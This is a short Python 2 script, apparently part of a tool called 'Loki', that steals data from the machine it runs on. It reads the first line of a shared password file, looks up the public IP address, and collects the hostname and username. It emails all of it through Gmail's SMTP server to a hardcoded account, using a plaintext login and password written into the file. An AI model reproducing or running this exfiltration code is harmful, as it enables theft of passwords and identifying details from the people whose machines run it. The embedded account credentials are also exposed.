import smtplib
import socket
import getpass
import ssl
from json import load
from urllib2 import urlopen

ip = load (urlopen ('http://jsonip.com'))['ip']

from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText

msg = MIMEMultipart()
msg['From'] = 'th3ta403@gmail.com'
msg['To'] = 'th3ta403@gmail.com'
msg['Subject'] = socket.gethostname ()
with open('/Users/Shared/Loki/Password.txt') as f:
    first_line = f.readline ()
message = getpass.getuser() + "\n" + first_line + "\n" + ip
msg.attach(MIMEText(message))

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login("th3ta403@gmail.com", "Theta403")
server.sendmail(
  "th3ta403@gmail.com", 
  "th3ta403@gmail.com", 
  msg.as_string ())
server.quit()